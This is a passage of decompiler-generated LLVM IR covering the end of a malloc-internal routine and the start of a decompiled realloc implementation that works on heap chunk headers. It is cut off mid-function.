  %v4_8053f20 = inttoptr i32 %v3_8053f20 to i32*
  store i32 %v0_8053f20, i32* %v4_8053f20, align 4
  br label %dec_label_pc_8053f2e

dec_label_pc_8053f25:                             ; preds = %dec_label_pc_8053905
  store i32 %v1_8053bbe, i32* %ebx.global-to-local, align 4
  %v0_8053f29 = load i32, i32* @ebp, align 4
  %v2_8053f29 = or i32 %v1_8053bbe, 4
  %v3_8053f29 = add i32 %v0_8053f29, %v2_8053f29
  %v4_8053f29 = inttoptr i32 %v3_8053f29 to i32*
  %v5_8053f29 = load i32, i32* %v4_8053f29, align 4
  %v6_8053f29 = or i32 %v5_8053f29, 1
  store i32 %v6_8053f29, i32* %v4_8053f29, align 4
  br label %dec_label_pc_8053f2e

dec_label_pc_8053f2e:                             ; preds = %dec_label_pc_8053ee4, %dec_label_pc_8053f25
  %v0_8053f2e = load i32, i32* @ebp, align 4
  %v1_8053f2e = add i32 %v0_8053f2e, 8
  store i32 %v1_8053f2e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053f33:                             ; preds = %dec_label_pc_80539f5
  %v1_8053f33 = load i32, i32* @ebx, align 4
  %v2_8053f33 = add i32 %v0_8053a01, 4
  %v3_8053f33 = add i32 %v2_8053f33, %v1_8053f33
  %v4_8053f33 = inttoptr i32 %v3_8053f33 to i32*
  %v5_8053f33 = load i32, i32* %v4_8053f33, align 4
  %v6_8053f33 = or i32 %v5_8053f33, 1
  store i32 %v6_8053f33, i32* %v4_8053f33, align 4
  br label %dec_label_pc_8053f38

dec_label_pc_8053f38:                             ; preds = %dec_label_pc_8053a0d, %dec_label_pc_8053f33
  %v0_8053f38 = load i32, i32* @ecx, align 4
  store i32 %v0_8053f38, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053f3c:                             ; preds = %dec_label_pc_8053cdf, %dec_label_pc_8053e7e, %dec_label_pc_8053d21, %dec_label_pc_8053cf7
  %v0_8053f3c = load i32, i32* %stack_var_-92, align 4
  %v1_8053f3c = call i32 @__errno_location(i32 %v0_8053f3c)
  store i32 %v1_8053f3c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053f43 = inttoptr i32 %v1_8053f3c to i32*
  store i32 12, i32* %v1_8053f43, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053f49:                             ; preds = %dec_label_pc_8053f38, %dec_label_pc_8053f2e, %dec_label_pc_8053ed9, %dec_label_pc_8053b6f, %dec_label_pc_8053b21, %dec_label_pc_80538a0, %dec_label_pc_8053f3c
  store i32 %v2_80537d7, i32* @eax, align 4
  store i32 %v2_80537d7, i32* %stack_var_-92, align 4
  %v2_8053f52 = call i32 @__pthread_return_void(i32 %v2_80537d7, i32 1)
  store i32 %v2_8053f52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f5a

dec_label_pc_8053f5a:                             ; preds = %dec_label_pc_80537f5, %dec_label_pc_8053f49
  %v0_8053f5d = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053f5d, i32* %eax.global-to-local, align 4
  %v2_8053f5f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053f5f, i32* @ebx, align 4
  store i32 %v0_80537c4, i32* @esi, align 4
  store i32 %v0_80537c3, i32* @edi, align 4
  store i32 %v0_80537c2, i32* @ebp, align 4
  ret i32 %v0_8053f5d

; uselistorder directives
  uselistorder i32 %v0_8053f20, { 1, 0 }
  uselistorder i32 %v1_8053ea4, { 1, 0 }
  uselistorder i32 %v2_8053e98, { 1, 0 }
  uselistorder i32 %v0_8053e83, { 1, 0 }
  uselistorder i32 %v0_8053e7e, { 0, 2, 1 }
  uselistorder i32 %v1_8053e15, { 1, 0, 2 }
  uselistorder i32 %v0_8053e15, { 1, 0 }
  uselistorder i32 %v2_8053e03, { 1, 0 }
  uselistorder i32 %v1_8053dba, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8053da8, { 1, 0, 2 }
  uselistorder i32 %v2_8053d98, { 1, 2, 0 }
  uselistorder i32 %v2_8053d93, { 1, 0, 2 }
  uselistorder i32 %v1_8053d83, { 2, 1, 0 }
  uselistorder i8 %v0_8053d51, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053d34, { 1, 0, 2 }
  uselistorder i32 %v0_8053df6, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8053de8, { 2, 0, 1 }
  uselistorder i32 %v8_8053d04, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8053cea, { 1, 0, 2 }
  uselistorder i32 %v3_8053cea, { 1, 0 }
  uselistorder i32 %v1_8053cb8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8053cac, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8053ca8, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053c96, { 1, 0 }
  uselistorder i32 %v1_8053c86, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8053c76, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8053c5f, { 1, 0 }
  uselistorder i32 %v2_8053c53, { 1, 0 }
  uselistorder i32 %v2_8053c43, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8053c27, { 1, 2, 0 }
  uselistorder i32 %v1_8053c27, { 1, 0, 2 }
  uselistorder i32 %v1_8053c26, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8053c20, { 1, 0 }
  uselistorder i32 %v2_8053bfe, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053bf2, { 2, 1, 0 }
  uselistorder i32 %v8_8053bdd, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8053bc4, { 1, 0, 2 }
  uselistorder i32 %v0_8053b67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8053b36, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053b29, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8053b0f, { 1, 0, 2 }
  uselistorder i32 %v1_8053aa9, { 1, 0 }
  uselistorder i32 %v3_8053a9e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8053a98, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8053a9512, { 1, 0 }
  uselistorder i32 %v2_8053a8a, { 1, 0 }
  uselistorder i32 %v1_8053a6e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8053a6a, { 2, 1, 0 }
  uselistorder i32 %v1_8053a66, { 1, 0 }
  uselistorder i32 %v1_8053a61, { 2, 1, 0 }
  uselistorder i32 %v2_8053a50, { 1, 0 }
  uselistorder i32 %v1_8053a4d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_80539eb, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8053a36, { 1, 0 }
  uselistorder i32 %v0_8053a01, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80539d7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80539a4, { 0, 2, 1 }
  uselistorder i32 %v2_8053988, { 1, 0 }
  uselistorder i32 %v1_805397e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8053979.lcssa, { 1, 0 }
  uselistorder i32 %v3_8053969, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8053960, { 1, 0, 2 }
  uselistorder i32 %v3_8053943, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_805393c, { 1, 0, 2 }
  uselistorder i32 %v2_8053924, { 2, 1, 0 }
  uselistorder i32 %v0_8053910, { 2, 1, 3, 0 }
  uselistorder i32 %v3_80538d6, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80539a4118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80539a4109, { 1, 0, 2 }
  uselistorder i32 %v3_8053883, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8053875, { 2, 1, 0 }
  uselistorder i32 %v2_8053850, { 2, 1, 0 }
  uselistorder i8 %v0_805381e, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8053bbe, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_8053807, { 1, 2, 0 }
  uselistorder i32 %v0_80537f0, { 1, 0 }
  uselistorder i32 %v2_80537d7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8062ba0.518, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134621300, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8062880.506, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806286c.503 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806286c.503 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053f5a, { 1, 0 }
  uselistorder label %dec_label_pc_8053f49, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053f3c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053f38, { 1, 0 }
  uselistorder label %dec_label_pc_8053f2e, { 1, 0 }
  uselistorder label %dec_label_pc_8053ed9, { 1, 0 }
  uselistorder label %dec_label_pc_8053e7e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053e10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053e0b, { 1, 0 }
  uselistorder label %dec_label_pc_8053def, { 1, 0 }
  uselistorder label %dec_label_pc_8053d98, { 1, 0 }
  uselistorder label %dec_label_pc_8053d81, { 1, 0 }
  uselistorder label %dec_label_pc_8053d6a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053d21, { 1, 0 }
  uselistorder label %dec_label_pc_8053cdf, { 1, 0 }
  uselistorder label %dec_label_pc_8053c76, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8053c15, { 1, 0 }
  uselistorder label %dec_label_pc_8053b29, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053b21, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053a95, { 1, 0 }
  uselistorder label %dec_label_pc_8053a9a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053a6e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80539f5, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_805397c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053965, { 1, 0 }
  uselistorder label %dec_label_pc_80538d3, { 1, 0 }
  uselistorder label %dec_label_pc_80539a4.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80538a0, { 1, 0 }
  uselistorder label %dec_label_pc_805381e, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053f66 = load i32, i32* @esi, align 4
  %v0_8053f67 = load i32, i32* @ebx, align 4
  %v4_8053f6b = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_8053f74 = icmp eq i1 %v4_8053f6b, false
  br i1 %v1_8053f74, label %dec_label_pc_8053f86, label %dec_label_pc_8053f76

dec_label_pc_8053f76:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8053f7a = call i32 @malloc(i32 %arg2)
  store i32 %v1_8053f7a, i32* %eax.global-to-local, align 4
  store i32 %v1_8053f7a, i32* @ebx, align 4
  br label %dec_label_pc_805428d

dec_label_pc_8053f86:                             ; preds = %entry
  %v1_8053f86 = icmp eq i32 %arg2, 0
  %v1_8053f88 = icmp eq i1 %v1_8053f86, false
  br i1 %v1_8053f88, label %dec_label_pc_8053f9b, label %dec_label_pc_8053f8a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053f86
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8053f91 = call i32 @free(i32 %tmp8)
  store i32 %v1_8053f91, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805428d

dec_label_pc_8053f9b:                             ; preds = %dec_label_pc_8053f86
  %v2_8053fa6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053fa6, i32* @eax, align 4
  store i32 %v2_8053fa6, i32* %stack_var_-60, align 4
  %v2_8053fab = call i32 @__pthread_return_void(i32 %v2_8053fa6, i32 134566343)
  store i32 %v2_8053fab, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c3d0.501 to i32), i32* %stack_var_-60, align 4
  %v1_8053fb7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c3d0.501 to i32))
  store i32 %v1_8053fb7, i32* %eax.global-to-local, align 4
  %v0_8053fbf = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8053fbf, -32
  br i1 %tmp, label %dec_label_pc_8053fd6, label %dec_label_pc_8053fc4

dec_label_pc_8053fc4:                             ; preds = %dec_label_pc_8053f9b
  %v0_8053fc4 = load i32, i32* %stack_var_-60, align 4
  %v1_8053fc4 = call i32 @__errno_location(i32 %v0_8053fc4)
  store i32 %v1_8053fc4, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053fcb = inttoptr i32 %v1_8053fc4 to i32*
  store i32 12, i32* %v1_8053fcb, align 4
  br label %dec_label_pc_8054290

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053f9b
  %v1_8053fd6 = add i32 %v0_8053fbf, 11
  %tmp22 = icmp ult i32 %v1_8053fd6, 16
  br i1 %tmp22, label %dec_label_pc_8053fed, label %dec_label_pc_8053fe6

dec_label_pc_8053fe6:                             ; preds = %dec_label_pc_8053fd6
  %v1_8053fe6 = and i32 %v1_8053fd6, -8
  br label %dec_label_pc_8053fed

dec_label_pc_8053fed:                             ; preds = %dec_label_pc_8053fd6, %dec_label_pc_8053fe6
  %stack_var_-40.0 = phi i32 [ %v1_8053fe6, %dec_label_pc_8053fe6 ], [ 16, %dec_label_pc_8053fd6 ]
  %storemerge21 = phi i32 [ %v1_8053fe6, %dec_label_pc_8053fe6 ], [ %v1_8053fd6, %dec_label_pc_8053fd6 ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8053ff1 = add i32 %tmp8, -8
  store i32 %v1_8053ff1, i32* @edi, align 4
  %v1_8053ff4 = add i32 %tmp8, -4
  %v2_8053ff4 = inttoptr i32 %v1_8053ff4 to i32*
  %v3_8053ff4 = load i32, i32* %v2_8053ff4, align 4
  store i32 %v3_8053ff4, i32* @edx, align 4
  %v1_8053ff9 = and i32 %v3_8053ff4, -4
  store i32 %v1_8053ff9, i32* %eax.global-to-local, align 4
  %v2_8053ffc = and i32 %v3_8053ff4, 2
  %v3_8053ffc = icmp eq i32 %v2_8053ffc, 0
  %v1_8054003 = icmp eq i1 %v3_8053ffc, false
  br i1 %v1_8054003, label %dec_label_pc_805419d, label %dec_label_pc_8054009

dec_label_pc_8054009:                             ; preds = %dec_label_pc_8053fed
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053ff9, i32* @ebx, align 4
  %v7_805400f = icmp ult i32 %v1_8053ff9, %stack_var_-40.0
  %v1_8054011 = icmp eq i1 %v7_805400f, false
  br i1 %v1_8054011, label %dec_label_pc_8054148, label %dec_label_pc_8054017

dec_label_pc_8054017:                             ; preds = %dec_label_pc_8054009
  %v2_8054017 = add i32 %v1_8053ff9, %v1_8053ff1
  store i32 %v2_8054017, i32* @esi, align 4
  %v1_805401a = load i32, i32* @global_var_806286c.503, align 4
  %v12_805401a = icmp eq i32 %v2_8054017, %v1_805401a
  %v1_8054020 = icmp eq i1 %v12_805401a, false
  %v1_805405a = add i32 %v2_8054017, 4
  %v2_805405a = inttoptr i32 %v1_805405a to i32*
  %v3_805405a = load i32, i32* %v2_805405a, align 4
  br i1 %v1_8054020, label %dec_label_pc_805405a, label %dec_label_pc_8054022

dec_label_pc_8054022:                             ; preds = %dec_label_pc_8054017
  %v1_8054027 = and i32 %v3_805405a, -4
  %v2_805402a = add i32 %v1_8054027, %v1_8053ff9
  store i32 %v2_805402a, i32* %ecx.global-to-local, align 4
  %v1_8054030 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8054030, i32* %eax.global-to-local, align 4
  %v7_8054033 = icmp ult i32 %v2_805402a, %v1_8054030
  br i1 %v7_8054033, label %dec_label_pc_8054098, label %dec_label_pc_8054037

dec_label_pc_8054037:                             ; preds = %dec_label_pc_8054022
  %v1_8054037 = urem i32 %v3_8053ff4, 2
  %v5_805403a = or i32 %v1_8054037, %stack_var_-40.0
  store i32 %v5_805403a, i32* @edx, align 4
  store i32 %v5_805403a, i32* %v2_8053ff4, align 4
  %v0_8054045 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054045 = sub i32 %v0_8054045, %stack_var_-40.0
  %v0_8054047 = load i32, i32* @edi, align 4
  %v2_8054047 = add i32 %v0_8054047, %stack_var_-40.0
  store i32 %v2_8054047, i32* %eax.global-to-local, align 4
  %v1_805404a = or i32 %v2_8054045, 1
  store i32 %v1_805404a, i32* %ecx.global-to-local, align 4
  store i32 %v2_8054047, i32* @global_var_806286c.503, align 4
  %v2_8054052 = add i32 %v2_8054047, 4
  %v3_8054052 = inttoptr i32 %v2_8054052 to i32*
  store i32 %v1_805404a, i32* %v3_8054052, align 4
  br label %dec_label_pc_805427b

dec_label_pc_805405a:                             ; preds = %dec_label_pc_8054017
  %v1_805405f = and i32 %v3_805405a, -2
  store i32 %v1_805405f, i32* %eax.global-to-local, align 4
  %v3_8054062 = add i32 %v1_805405a, %v1_805405f
  %v4_8054062 = inttoptr i32 %v3_8054062 to i8*
  %v5_8054062 = load i8, i8* %v4_8054062, align 1
  %v6_8054062 = urem i8 %v5_8054062, 2
  %v7_8054062 = icmp eq i8 %v6_8054062, 0
  %v1_8054067 = icmp eq i1 %v7_8054062, false
  br i1 %v1_8054067, label %dec_label_pc_8054098, label %dec_label_pc_8054069

dec_label_pc_8054069:                             ; preds = %dec_label_pc_805405a
  %v1_805406d = and i32 %v3_805405a, -4
  %v2_8054070 = add i32 %v1_805406d, %v1_8053ff9
  store i32 %v2_8054070, i32* @ebx, align 4
  %v10_8054072 = icmp ult i32 %v2_8054070, %stack_var_-40.0
  br i1 %v10_8054072, label %dec_label_pc_8054098, label %dec_label_pc_8054078

dec_label_pc_8054078:                             ; preds = %dec_label_pc_8054069
  %v1_8054078 = add i32 %v1_8053ff9, %tmp8
  %v2_8054078 = inttoptr i32 %v1_8054078 to i32*
  %v3_8054078 = load i32, i32* %v2_8054078, align 4
  store i32 %v3_8054078, i32* @edx, align 4
  %v1_805407b = add i32 %v2_8054017, 12
  %v2_805407b = inttoptr i32 %v1_805407b to i32*
  %v3_805407b = load i32, i32* %v2_805407b, align 4
  store i32 %v3_805407b, i32* %eax.global-to-local, align 4
  %v1_805407e = add i32 %v3_8054078, 12
  %v2_805407e = inttoptr i32 %v1_805407e to i32*
  %v3_805407e = load i32, i32* %v2_805407e, align 4
  %v15_805407e = icmp eq i32 %v3_805407e, %v2_8054017
  %v1_8054081 = icmp eq i1 %v15_805407e, false
  br i1 %v1_8054081, label %dec_label_pc_8054088, label %dec_label_pc_8054083

dec_label_pc_8054083:                             ; preds = %dec_label_pc_8054078
  %v1_8054083 = add i32 %v3_805407b, 8
  %v2_8054083 = inttoptr i32 %v1_8054083 to i32*
  %v3_8054083 = load i32, i32* %v2_8054083, align 4
  %v15_8054083 = icmp eq i32 %v3_8054083, %v2_8054017
  br i1 %v15_8054083, label %dec_label_pc_805408d, label %dec_label_pc_8054088

dec_label_pc_8054088:                             ; preds = %dec_label_pc_8054083, %dec_label_pc_8054078
  %v0_8054088 = call i32 @abort()
  store i32 %v0_8054088, i32* %eax.global-to-local, align 4
  %v1_805408d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805408d

dec_label_pc_805408d:                             ; preds = %dec_label_pc_8054083, %dec_label_pc_8054088
  %v1_805408d = phi i32 [ %v3_8054078, %dec_label_pc_8054083 ], [ %v1_805408d.pre, %dec_label_pc_8054088 ]
  %v0_805408d = phi i32 [ %v3_805407b, %dec_label_pc_8054083 ], [ %v0_8054088, %dec_label_pc_8054088 ]
  %v2_805408d = add i32 %v1_805408d, 12
  %v3_805408d = inttoptr i32 %v2_805408d to i32*
  store i32 %v0_805408d, i32* %v3_805408d, align 4
  %v0_8054090 = load i32, i32* @edx, align 4
  %v1_8054090 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054090 = add i32 %v1_8054090, 8
  %v3_8054090 = inttoptr i32 %v2_8054090 to i32*
  store i32 %v0_8054090, i32* %v3_8054090, align 4
  %v0_8054148.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054148

dec_label_pc_8054098:                             ; preds = %dec_label_pc_8054069, %dec_label_pc_805405a, %dec_label_pc_8054022
  %v1_805409f = add i32 %stack_var_-40.0, -7
  store i32 %v1_805409f, i32* %eax.global-to-local, align 4
  store i32 %v1_805409f, i32* %stack_var_-60, align 4
  %v1_80540a3 = call i32 @malloc(i32 %v1_805409f)
  store i32 %v1_80540a3, i32* %eax.global-to-local, align 4
  %v1_80540ab = icmp eq i32 %v1_80540a3, 0
  store i32 %v1_80540a3, i32* @edx, align 4
  br i1 %v1_80540ab, label %dec_label_pc_8054277, label %dec_label_pc_80540b5

dec_label_pc_80540b5:                             ; preds = %dec_label_pc_8054098
  %v1_80540b5 = add i32 %v1_80540a3, -8
  store i32 %v1_80540b5, i32* %ebx.global-to-local, align 4
  %v1_80540b8 = load i32, i32* @esi, align 4
  %v12_80540b8 = icmp eq i32 %v1_80540b5, %v1_80540b8
  %v1_80540ba = add i32 %v1_80540a3, -4
  %v2_80540ba = inttoptr i32 %v1_80540ba to i32*
  %v3_80540ba = load i32, i32* %v2_80540ba, align 4
  store i32 %v3_80540ba, i32* %eax.global-to-local, align 4
  %v1_80540bd = icmp eq i1 %v12_80540b8, false
  br i1 %v1_80540bd, label %dec_label_pc_80540cb, label %dec_label_pc_80540bf

dec_label_pc_80540bf:                             ; preds = %dec_label_pc_80540b5
  store i32 %v1_8053ff9, i32* @edx, align 4
  %v1_80540c3 = and i32 %v3_80540ba, -4
  store i32 %v1_80540c3, i32* %eax.global-to-local, align 4
  %v2_80540c6 = add i32 %v1_80540c3, %v1_8053ff9
  store i32 %v2_80540c6, i32* @ebx, align 4
  br label %dec_label_pc_8054148

dec_label_pc_80540cb:                             ; preds = %dec_label_pc_80540b5
  %v1_80540cf = add i32 %v1_8053ff9, -4
  store i32 %v1_80540cf, i32* %eax.global-to-local, align 4
  %v2_80540d4 = udiv i32 %v1_80540cf, 4
  store i32 %v2_80540d4, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_80540cf, 37
  br i1 %tmp23, label %dec_label_pc_80540ed, label %dec_label_pc_80540dc

dec_label_pc_80540dc:                             ; preds = %dec_label_pc_80540cb
  store i32 %v1_80540a3, i32* %stack_var_-60, align 4
  %v3_80540e3 = inttoptr i32 %v1_80540a3 to i16*
  %v4_80540e3 = call i32 @memcpy(i16* %v3_80540e3, i32 %tmp8, i32 %v1_80540cf)
  store i32 %v4_80540e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054134

dec_label_pc_80540ed:                             ; preds = %dec_label_pc_80540cb
  store i32 %tmp8, i32* @esi, align 4
  %v2_80540f4 = load i32, i32* %arg1, align 4
  store i32 %v2_80540f4, i32* %eax.global-to-local, align 4
  %v2_80540f6 = inttoptr i32 %v1_80540a3 to i32*
  store i32 %v2_80540f4, i32* %v2_80540f6, align 4
  %v0_80540f8 = load i32, i32* @esi, align 4
  %v1_80540f8 = add i32 %v0_80540f8, 4
  %v2_80540f8 = inttoptr i32 %v1_80540f8 to i32*
  %v3_80540f8 = load i32, i32* %v2_80540f8, align 4
  store i32 %v3_80540f8, i32* %eax.global-to-local, align 4
  %v1_80540fb = load i32, i32* @edx, align 4
  %v2_80540fb = add i32 %v1_80540fb, 4
  %v3_80540fb = inttoptr i32 %v2_80540fb to i32*
  store i32 %v3_80540f8, i32* %v3_80540fb, align 4
  %v0_80540fe = load i32, i32* @esi, align 4
  %v1_80540fe = add i32 %v0_80540fe, 8
  %v2_80540fe = inttoptr i32 %v1_80540fe to i32*
  %v3_80540fe = load i32, i32* %v2_80540fe, align 4
  store i32 %v3_80540fe, i32* %eax.global-to-local, align 4
  %v1_8054101 = load i32, i32* @edx, align 4
  %v2_8054101 = add i32 %v1_8054101, 8
  %v3_8054101 = inttoptr i32 %v2_8054101 to i32*
  store i32 %v3_80540fe, i32* %v3_8054101, align 4
  %tmp24 = icmp ult i32 %v1_80540cf, 17
  br i1 %tmp24, label %dec_label_pc_8054134, label %dec_label_pc_8054106

dec_label_pc_8054106:                             ; preds = %dec_label_pc_80540ed
  %v0_8054106 = load i32, i32* @esi, align 4
  %v1_8054106 = add i32 %v0_8054106, 12
  %v2_8054106 = inttoptr i32 %v1_8054106 to i32*
  %v3_8054106 = load i32, i32* %v2_8054106, align 4
  store i32 %v3_8054106, i32* %eax.global-to-local, align 4
  %v0_8054109 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805410c = load i32, i32* @edx, align 4
  %v2_805410c = add i32 %v1_805410c, 12
  %v3_805410c = inttoptr i32 %v2_805410c to i32*
  store i32 %v3_8054106, i32* %v3_805410c, align 4
  %v0_805410f = load i32, i32* @esi, align 4
  %v1_805410f = add i32 %v0_805410f, 16
  %v2_805410f = inttoptr i32 %v1_805410f to i32*
  %v3_805410f = load i32, i32* %v2_805410f, align 4
  store i32 %v3_805410f, i32* %eax.global-to-local, align 4
  %v1_8054112 = load i32, i32* @edx, align 4
  %v2_8054112 = add i32 %v1_8054112, 16
  %v3_8054112 = inttoptr i32 %v2_8054112 to i32*
  store i32 %v3_805410f, i32* %v3_8054112, align 4
  %tmp25 = icmp ult i32 %v0_8054109, 7
  br i1 %tmp25, label %dec_label_pc_8054134, label %dec_label_pc_8054117

dec_label_pc_8054117:                             ; preds = %dec_label_pc_8054106
  %v0_8054117 = load i32, i32* @esi, align 4
  %v1_8054117 = add i32 %v0_8054117, 20
  %v2_8054117 = inttoptr i32 %v1_8054117 to i32*
  %v3_8054117 = load i32, i32* %v2_8054117, align 4
  store i32 %v3_8054117, i32* %eax.global-to-local, align 4
  %v0_805411a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805411d = load i32, i32* @edx, align 4
  %v2_805411d = add i32 %v1_805411d, 20
  %v3_805411d = inttoptr i32 %v2_805411d to i32*
  store i32 %v3_8054117, i32* %v3_805411d, align 4
  %v0_8054120 = load i32, i32* @esi, align 4
  %v1_8054120 = add i32 %v0_8054120, 24
  %v2_8054120 = inttoptr i32 %v1_8054120 to i32*
  %v3_8054120 = load i32, i32* %v2_8054120, align 4
  store i32 %v3_8054120, i32* %eax.global-to-local, align 4
  %v1_8054123 = load i32, i32* @edx, align 4
  %v2_8054123 = add i32 %v1_8054123, 24
  %v3_8054123 = inttoptr i32 %v2_8054123 to i32*
  store i32 %v3_8054120, i32* %v3_8054123, align 4
  %tmp26 = icmp ult i32 %v0_805411a, 9
  br i1 %tmp26, label %dec_label_pc_8054134, label %dec_label_pc_8054128

dec_label_pc_8054128:                             ; preds = %dec_label_pc_8054117
  %v0_8054128 = load i32, i32* @esi, align 4
  %v1_8054128 = add i32 %v0_8054128, 28
  %v2_8054128 = inttoptr i32 %v1_8054128 to i32*
  %v3_8054128 = load i32, i32* %v2_8054128, align 4
  store i32 %v3_8054128, i32* %eax.global-to-local, align 4
  %v1_805412b = load i32, i32* @edx, align 4
  %v2_805412b = add i32 %v1_805412b, 28
  %v3_805412b = inttoptr i32 %v2_805412b to i32*
  store i32 %v3_8054128, i32* %v3_805412b, align 4
  %v0_805412e = load i32, i32* @esi, align 4
  %v1_805412e = add i32 %v0_805412e, 32
  %v2_805412e = inttoptr i32 %v1_805412e to i32*
